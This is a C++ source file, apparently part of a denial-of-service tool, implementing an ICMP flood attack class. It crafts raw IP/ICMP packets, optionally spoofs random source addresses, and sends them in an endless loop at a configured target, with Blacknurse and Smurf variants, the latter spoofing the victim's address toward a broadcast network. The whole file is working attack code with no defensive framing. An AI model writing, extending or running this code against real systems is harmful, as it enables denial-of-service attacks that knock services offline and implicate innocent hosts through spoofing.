#include <unistd.h>
#include <cstring>
#include <netdb.h>
#include <arpa/inet.h>
#include <netinet/ip_icmp.h>

#include "../Headers/ICMP_Flood.hpp"
#include "../Headers/Randomizer.hpp"

void ICMP_Flood::attack(const int *id) {
    int r;
    std::vector<int> sockets;
    for (int x = 0; x < conf->CONNECTIONS; x++) {
        sockets.push_back(0);
    }
    char buf[400];
    std::string message{};
    // Structs
    auto *ip = (struct iphdr *)buf;
    auto *icmp = (struct icmphdr *)(ip + 1);
    struct hostent *hp;
    struct sockaddr_in dst{};
    while(true){
        for(int x = 0;x < conf->CONNECTIONS; x++){
            bzero(buf, sizeof(buf));
            if(!sockets[x]){
                sockets[x] = make_socket(IPPROTO_ICMP);
            }

            if((hp = gethostbyname(conf->website.c_str())) == nullptr){
                if((ip->daddr = inet_addr(conf->website.c_str())) == -1){
                    conf->logger->Log("Can't resolve the host", Logger::Error);
                    exit(EXIT_FAILURE);
                }
            }else{
                bcopy(hp->h_addr_list[0], &ip->daddr, static_cast<size_t>(hp->h_length));
            }
            if(conf->RandomizeSource){
                if((ip->saddr = inet_addr(Randomizer::randomIP().c_str())) == -1){
                    continue;
                }
            }else{
                ip->saddr = 0;
            }

            init_headers(ip, icmp, buf);
            override_headers(icmp, ip);

            dst.sin_addr.s_addr = ip->daddr;
            dst.sin_family = AF_UNSPEC;

            icmp->checksum = htons(csum((unsigned short *) buf, (sizeof(struct ip) + sizeof(struct icmphdr))));

            if((r = static_cast<int>(sendto(sockets[x], buf, sizeof(buf), 0, (struct sockaddr *)&dst, sizeof(dst)))) == -1){
                close(sockets[x]);
                sockets[x] = make_socket(IPPROTO_ICMP);
            }else{
                message = std::string("Socket[") + std::to_string(x) + "->"
                          + std::to_string(sockets[x]) + "] -> " + std::to_string(r);
                conf->logger->Log(&message, Logger::Info);
                message = std::to_string(*id) + ": Voly Sent";
                conf->logger->Log(&message, Logger::Info);
            }
        }
        message = std::to_string(*id) + ": Voly Sent";
        conf->logger->Log(&message, Logger::Info);
        pause();
    }
}

ICMP_Flood::ICMP_Flood(std::shared_ptr<Config> conf) : Spoofed_Flood(conf) {

}

void ICMP_Flood::override_headers(icmphdr *icmp, iphdr *ip){
    switch (conf->vector){
        case Config::ICMPFlood:
            icmp->type = static_cast<u_int8_t>(Randomizer::randomInt(1, 30));
            icmp->code = static_cast<u_int8_t>(Randomizer::randomInt(1, 15));
            break;
        case Config::Blacknurse:
            icmp->type = ICMP_DEST_UNREACH;
            icmp->code = ICMP_PORT_UNREACH;
            break;
        case Config::Smurf:
            icmp->type = ICMP_ECHO;
            icmp->type = ICMP_NET_UNREACH;
            ip->daddr = inet_addr(conf->broadcast.c_str());
            ip->saddr = inet_addr(conf->website.c_str());
        default:break;
    }
}


void ICMP_Flood::init_headers(iphdr *ip, icmphdr *icmp, char *buf) {
    // IP Struct
    ip->version = 4;
    ip->ihl = 5;
    ip->tos = 0;
    ip->tot_len = htons(sizeof(buf));
    ip->id = static_cast<u_short>(Randomizer::randomInt(1, 1000));
    ip->frag_off = htons(0x0);
    ip->ttl = 255;
    ip->protocol = IPPROTO_ICMP;
    ip->check = 0;

    ip->check = csum((unsigned short *) buf, ip->tot_len);

    icmp->type = 0;
    icmp->code = 0;
    icmp->un.echo.sequence = static_cast<u_int16_t>(Randomizer::randomInt(1, 1000));
    icmp->un.echo.id = static_cast<u_int16_t>(Randomizer::randomInt(1, 1000));
    icmp->checksum = 0;
}
